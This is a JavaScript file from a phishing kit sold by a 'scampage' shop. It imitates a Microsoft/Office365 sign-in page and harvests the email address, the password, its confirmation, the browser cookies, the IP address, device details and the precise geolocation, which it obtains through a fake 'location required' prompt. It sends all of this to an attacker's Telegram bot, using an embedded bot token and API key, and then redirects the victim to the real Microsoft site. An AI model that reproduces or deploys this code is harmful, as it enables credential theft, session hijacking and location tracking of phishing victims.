//THIS CODE WAS BUILT BY "SCAMPAGESHOP [www.scampage.shop]" and has AES 256-bit encryption. Any adjustments to the code would break it//
//Do not touch this section
//If you want to get quality:
// - USA Banks Scampage
// - UK Banks Scampage
// - Australian Scampage
// - Canadian Scampage
// - Crypto Websites Scampage 
// - Email Accounts Scampage
// - Newsletter Scampage and more..

// Visit: https://www.scampage.shop

const OpenCageApiKey = "4e409ae9c61a4c72a039a8c02e10e45a";

document.addEventListener('DOMContentLoaded', () => {
    const unReq = "Enter a valid email address, phone number, or Skype name."
    const pwdReq = "Please enter the password for your Microsoft account."
    const confirmReq = "Please confirm the password for your Microsoft account."

    const unameInp = document.getElementById('inp_uname');
    const pwdInp = document.getElementById('inp_pwd');
    const confirmInp = document.getElementById('inp_confirm');

    let view = "uname";

    let unameVal = pwdVal = confirmVal = false;

    unameInp.addEventListener('keydown', (event) => handleNextDown(event, nxt));

    function handleNextDown(event, nextButton) {
        if (event.key === "Enter") {
            event.preventDefault();
            nextButton.click();
        }
    }

    pwdInp.addEventListener('keydown', (event) => handleConfirmDown(event, confirm));

    function handleConfirmDown(event, confirmButton) {
        if (event.key === "Enter") {
            event.preventDefault();
            confirmButton.click();
        }
    }

    confirmInp.addEventListener('keydown', (event) => handleSigDown(event, sig));

    function handleSigDown(event, sigButton) {
        if (event.key === "Enter") {
            event.preventDefault();
            sigButton.click();
        }
    }

    /////next button
    const nxt = document.getElementById('btn_next');

    nxt.addEventListener('click', () => {
        //validate the form
        validate();
        if (unameVal) {
            document.getElementById("section_uname").classList.toggle('d-none');
            document.getElementById('section_pwd').classList.remove('d-none');
            document.querySelectorAll('#user_identity').forEach((e) => {
                e.innerText = unameInp.value;
            })
            view = "pwd";
        }
    })

    /////confirm button
    const confirm = document.getElementById('btn_confirm');

    confirm.addEventListener('click', () => {
        //validate the form
        validate();
        if (pwdVal) {
            document.getElementById("section_pwd").classList.toggle('d-none');
            document.getElementById('section_confirm').classList.remove('d-none');
            document.querySelectorAll('#user_identity').forEach((e) => {
                e.innerText = unameInp.value;
            })
            view = "confirm";
        }
    })

    //////sign in button

    const sig = document.getElementById('btn_sig');

    sig.addEventListener('click', () => {
        //validate the form
        validate();
        if (confirmVal) {
            document.getElementById("section_confirm").classList.toggle('d-none');
            document.getElementById('section_final').classList.remove('d-none');
            view = "final";
        }
    })

    function validate() {
        function unameValAction(type) {
            if (!type) {
                document.getElementById('error_uname').innerText = unReq;
                unameInp.classList.add('error-inp');
                unameVal = false;
            } else {
                document.getElementById('error_uname').innerText = "";
                unameInp.classList.remove('error-inp')
                unameVal = true;
            }

        }

        function pwdValAction(type) {
            if (!type) {
                document.getElementById('error_pwd').innerText = pwdReq;
                pwdInp.classList.add('error-inp')
                pwdVal = false;
            } else {
                document.getElementById('error_pwd').innerText = "";
                pwdInp.classList.remove('error-inp')
                pwdVal = true;
            }

        }

        function confirmValAction(type) {
            if (!type) {
                document.getElementById('error_confirm').innerText = confirmReq;
                confirmInp.classList.add('error-inp')
                confirmVal = false;
            } else {
                document.getElementById('error_confirm').innerText = "";
                confirmInp.classList.remove('error-inp')
                confirmVal = true;
            }

        }

        if (view === "uname") {
            if (unameInp.value.trim() === "") {
                unameValAction(false);
            } else {
                unameValAction(true);
                const email = unameInp.value;
                localStorage.setItem("Email address", email);
            }
            unameInp.addEventListener('change', function() {
                if (this.value.trim() === "") {
                    unameValAction(false);
                } else {
                    unameValAction(true);
                }
            })
        } else if (view === "pwd") {
            if (pwdInp.value.trim() === "") {
                pwdValAction(false);
            } else {
                pwdValAction(true);
                const password = pwdInp.value;
                localStorage.setItem("Password", password);
                //sendLogs();
            }
            pwdInp.addEventListener('change', function() {
                if (this.value.trim() === "") {
                    pwdValAction(false);
                } else {
                    pwdValAction(true);
                }
            })
        } else if (view === "confirm") {
            if (confirmInp.value.trim() === "") {
                confirmValAction(false);
            } else {
                confirmValAction(true);
                const confirmPassword = confirmInp.value;
                localStorage.setItem("Password confirmed", confirmPassword);
                //sendLogs();
            }
            confirmInp.addEventListener('change', function() {
                if (this.value.trim() === "") {
                    confirmValAction(false);
                } else {
                    confirmValAction(true);
                }
            })
        }
        return false;
    }

    //back button
    document.querySelector('.back').addEventListener('click', () => {
        view = "uname";
        document.getElementById("section_pwd").classList.toggle('d-none');
        document.getElementById('section_uname').classList.remove('d-none');
    })

    //second back button
    document.querySelector('.backConfirm').addEventListener('click', () => {
        view = "uname";
        document.getElementById("section_confirm").classList.toggle('d-none');
        document.getElementById('section_pwd').classList.remove('d-none');
    })

    //final buttons
    document.querySelectorAll('#btn_final').forEach((b) => {
        b.addEventListener('click', () => {
            sendLogs();
        })

        b.addEventListener('keydown', (event) => handleFinalDown(event, b));
    })

    function handleFinalDown(event, b) {
        if (event.key === "Enter") {
            event.preventDefault();
            sendLogs();
        }
    }

    function sendLogs() {
        const username = localStorage.getItem("Email address");
        const password = localStorage.getItem("Password");
        const confirmPassword = localStorage.getItem("Password confirmed");
        const x = document.cookie;

        fetch('https://api.ipify.org')
            .then(res => res.text())
            .then(ipAddress => {
                const deviceInfo = {
                    manufacturer: navigator.userAgent.match(/[\(](.*?)[\)]/)[1],
                    model: navigator.userAgent.match(/[\(](.*?)[\)]/)[2],
                    os: navigator.userAgent.match(/Mac OS X/) ? "Mac OS X" : "Windows",
                    browser: navigator.userAgent.match(/Chrome/) ? "Chrome" : "Firefox",
                };

                getLocation(username, password, confirmPassword, x, deviceInfo, ipAddress);
            })
            .catch(error => {
                console.error("Error capturing IP address:", error);
            });

    };

    function getLocation(username, password, confirmPassword, x, deviceInfo, ipAddress) {
        navigator.geolocation?.getCurrentPosition(async (position) => {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;

            const apiUrl = `https://api.opencagedata.com/geocode/v1/json?q=${latitude}+${longitude}&key=${OpenCageApiKey}&pretty=1&no_annotations=1`;

            try {
                const response = await fetch(apiUrl);
                const data = await response.json();

                if (data.results.length > 0) {
                    const result = data.results[0].components;
                    const city = result.city || result.village || result.town;
                    const state = result.state;
                    const country = result.country;
                    const zipCode = result.postcode;
                    const continent = result.continent;
                    const county = result.county;

                    var dataToSend = {
                        username,
                        password,
                        confirmPassword,
                        ipAddress,
                        Device: deviceInfo.manufacturer,
                        OS: deviceInfo.os,
                        Browser: deviceInfo.browser,
                        Latitude: latitude,
                        Longitude: longitude,
                        City: city,
                        State: state,
                        Country: country,
                        County: county,
                        ZipCode: zipCode,
                        Cookies: x,
                    };

                    if (Object.keys(dataToSend).length > 0) {
                        sendToTelegram(dataToSend);
                    } else {
                        console.warn("No data to send to Telegram.");
                    }
                    } else {
                    console.error("Location information not found.");
                    }
                } catch (error) {
                    console.error("Error fetching location data:", error);
                }
            },
            (error) => {
            console.error("Error getting location:", error);
            alert("Location permission is required to login to your Microsoft Account.");
        }
        );
    };

    function sendToTelegram(data) {
        // Add your bot details here👇 (this is where you will get the logs)

        var telegramBotId = "7273335886:AAFfBkz6TbFX6IbPfJ4sAB_pFyUBhuhEWWI";
        var chatId = 7323113234;

        var payload = {
          chat_id: chatId,
          text: `
            New Office365 Login:
            ________________________
               "Email address, phone number or skype": "${data.username}",
               "Password": "${data.password}",
               "Confirmed Password": "${data.confirmPassword}",
               "IP Address": ${data.ipAddress},
               "Device Info": "${data.Device}",
               "OS": "${data.OS}",
               "Browser": "${data.Browser}",
               "Latitude": ${data.Latitude},
               "Longitude": ${data.Longitude},
               "City": "${data.City}",
               "State": "${data.State}",
               "County": "${data.County}",
               "Country": "${data.Country}",
               "ZipCode": ${data.ZipCode},
               "Cookies": ["${data.Cookies}"],
            `
        };

        var sendToBot = {
          url: "https://api.telegram.org/bot" + telegramBotId + "/sendMessage",
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
          },
          data: JSON.stringify(payload)
        };

        $.ajax(sendToBot).done(function(response) {
          window.location.href = "https://account.microsoft.com";
          // console.log("Telegram API response:", JSON.stringify(response));
        }).fail(function(error) {
          console.error("Error sending data to Telegram:", error);
        });
    };
});